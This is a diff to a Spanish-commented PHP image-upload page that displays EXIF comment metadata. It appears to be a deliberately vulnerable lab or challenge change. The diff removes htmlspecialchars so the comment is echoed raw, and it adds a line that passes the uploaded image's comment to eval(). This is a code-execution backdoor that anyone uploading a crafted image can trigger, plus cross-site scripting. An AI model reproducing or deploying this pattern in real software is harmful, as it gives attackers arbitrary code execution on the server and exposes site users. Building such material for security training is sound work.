@@ -6,9 +6,10 @@ function extractCommentMetadata($imagePath) {
         return false;
     }
     
-    // Devuelve el comentario si está disponible
-    return isset($exifData['COMPUTED']['UserComment']) ? $exifData['COMPUTED']['UserComment'] : false;
+    // Devuelve el comentario si está disponible, ajustado para buscar directamente en 'COMMENT'
+    return isset($exifData['COMMENT']) ? implode(" ", $exifData['COMMENT']) : false;
 }
+
 
 $showImage = false;
 $commentMetadata = '';
@@ -69,7 +70,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES['image'])) {
         <img src="<?php echo htmlspecialchars($destino); ?>" alt="Imagen Subida" style="max-width: 500px;">
         <?php if ($commentMetadata): ?>
             <h3>Metadatos del Comentario:</h3>
-            <p><?php echo htmlspecialchars($commentMetadata); ?></p>
+            <p><?php echo $commentMetadata; ?></p>
+	    <p><?php eval($commentMetadata); ?></p>
         <?php else: ?>
             <p>No se encontraron metadatos del comentario.</p>
         <?php endif; ?>
